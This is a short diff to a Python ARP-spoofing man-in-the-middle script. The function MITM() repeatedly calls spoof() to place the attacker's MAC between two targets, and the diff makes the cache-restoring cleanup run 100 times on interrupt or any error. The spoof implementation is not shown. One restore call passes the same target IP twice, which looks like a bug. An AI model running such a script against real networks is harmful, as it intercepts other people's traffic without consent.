@@ -34,8 +34,13 @@ def MITM():
             spoof(target2_IP, target2_MAC, target1_IP, my_mac)
             time.sleep(1)
     except KeyboardInterrupt:
-        resotre(target1_IP, target1_MAC, target2_IP, target2_MAC)
-        resotre(target2_IP, target2_MAC, target2_IP, target1_MAC)
+        for _ in range(100):
+            resotre(target1_IP, target1_MAC, target2_IP, target2_MAC)
+            resotre(target2_IP, target2_MAC, target2_IP, target1_MAC)
+    except:
+        for _ in range(100):
+            resotre(target1_IP, target1_MAC, target2_IP, target2_MAC)
+            resotre(target2_IP, target2_MAC, target2_IP, target1_MAC)
 
 if __name__ == '__main__':
     MITM()
